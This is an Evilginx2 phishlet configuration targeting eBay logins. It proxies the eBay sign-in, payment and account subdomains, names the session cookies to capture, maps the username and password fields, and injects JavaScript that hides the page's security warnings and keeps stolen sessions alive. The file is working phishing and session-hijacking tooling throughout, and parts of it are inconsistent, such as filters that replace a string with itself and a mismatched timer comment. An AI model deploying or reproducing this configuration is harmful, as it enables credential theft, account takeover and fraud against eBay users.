---
name: ebay
author: Anon0369G
min_ver: 3.0.0
proxy_hosts:
  - phish_sub: www
    orig_sub: www
    domain: ebay.com
    session: true
    is_landing: true
  - phish_sub: signin
    orig_sub: signin
    domain: ebay.com
    session: true
  - phish_sub: pay
    orig_sub: pay
    domain: ebay.com
    session: true
  - phish_sub: my
    orig_sub: my
    domain: ebay.com
    session: true
sub_filters:
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/
    replace: https://{hostname}
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://signin.{hostname}/
    replace: https://signin.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://auth.{hostname}/
    replace: https://signin.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: pay.ebay.com
    orig_sub: pay
    domain: ebay.com
    search: https://pay.{hostname}/
    replace: https://pay.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: my.ebay.com
    orig_sub: my
    domain: ebay.com
    search: https://my.{hostname}/
    replace: https://my.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: my.ebay.com
    orig_sub: account
    domain: ebay.com
    search: https://account.{hostname}/
    replace: https://my.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/logout
    replace: https://{hostname}/logout
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://signin.{hostname}/logout
    replace: https://signin.{hostname}/logout
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: '"https://{hostname}/'
    replace: '"https://{hostname}/'
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: "'https://{hostname}/"
    replace: "'https://{hostname}/"
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: "@{hostname}"
    replace: "@{hostname}"
    mimes:
      - text/html
      - application/json
      - application/javascript
auth_tokens:
  - domain: .ebay.com
    keys:
      - s
      - dp1
      - npii
      - eid
      - ebay_token
    type: cookie
    session_keys:
      - s
      - dp1
auth_urls:
  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
  - https://www.ebay.com/signin
  - https://www.ebay.com/myb/SignIn
  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&signInAction=login
  - https://www.ebay.com/verify
urls:
  login: https://www.ebay.com/signin
  logout: https://www.ebay.com/logout
  MFA: https://www.ebay.com/mfa
  password_reset: https://www.ebay.com/password-reset
  account_recovery: https://www.ebay.com/account-recovery
force_post:
  - url: 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'
    method: 'POST'
    headers:
      Content-Type: 'application/x-www-form-urlencoded'
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
      Accept-Language: 'en-US,en;q=0.9'
      Accept-Encoding: 'gzip, deflate, br'
      Connection: 'keep-alive'
      Referer: 'https://www.ebay.com/signin'
      Origin: 'https://signin.ebay.com'
      Dnt: '1'  # Do Not Track header
      Cookie: 's=your_session_cookie_here; dp1=your_dp1_cookie_here; npii=your_npii_cookie_here'  # Example cookies, replace with actual ones
      Cache-Control: 'max-age=0'
    body:
      - { key: 'userid', value: '{{credentials.username}}' }
      - { key: 'pass', value: '{{credentials.password}}' }

credentials:
  username:
    key: 'userid'         # The name of the email/username field on eBay login
    type: 'email'          # Field type for email
    required: true
    search: 'userid'
  password:
    key: 'pass'           # The name of the password field on eBay login
    type: 'password'       # Field type for password
    required: true
    search: 'pass'
    
login:
  domain: 'signin.ebay.com'  # The target domain for the login form
  path: '/ws/eBayISAPI.dll?SignIn'  # Path for login form submission
  method: 'POST'  # HTTP method for form submission
  form:
    fields:
      - { name: 'userid', required: true }    # Username field
      - { name: 'pass', required: true }      # Password field
rules:
  - triggers:
      - domain: ebay.com
        path: /signin
        cookie:
          contains: s
        action: inject
    inject_js:
      code: |
        (function() {
          console.log('Evilginx2 custom script: Executed on /signin');
          // Additional JS to ensure smooth interaction with the login page.
        })();
  - triggers:
      - domain: ebay.com
        path: /mfa
        cookie:
          contains: dp1
        action: inject
    inject_js:
      code: |
        (function() {
          console.log('Handling MFA for ebay.com');
          // Insert any JS required for MFA handling.
        })();
  - triggers:
      - domain: ebay.com
        path: /reauth
        cookie:
          contains: ebay_token
        action: inject
    inject_js:
      code: >
        (function() {
          console.log('Handling re-authentication for session continuity');
          // Insert JavaScript for re-authentication or session refresh if needed.
        })();
  - triggers:
      - domain: ebay.com
        path: /logout
        action: redirect
        redirect_to: https://www.ebay.com/signin
js_inject:
- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com", "auth.ebay.com"]
  trigger_paths: ["/signin", "/signin?signInAction=login", "/myb/SignIn", "/verify", "/my", "/myb/Account", "/pay", "/pay/checkout", "/logout"]
  script: >
    (function() {
        const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
        securityMessages.forEach(element => element.style.display = 'none');
        
        const loginForm = document.querySelector('#signin-form');
        if (loginForm) {
            loginForm.addEventListener('submit', function() {
                console.log("Login form submitted.");
            });
        }
        
        setInterval(() => {
            fetch(window.location.href, { method: 'GET', credentials: 'include' });
            console.log("Session refreshed to maintain active login.");
        }, 40000);  // 30 seconds interval for session refresh
    })();
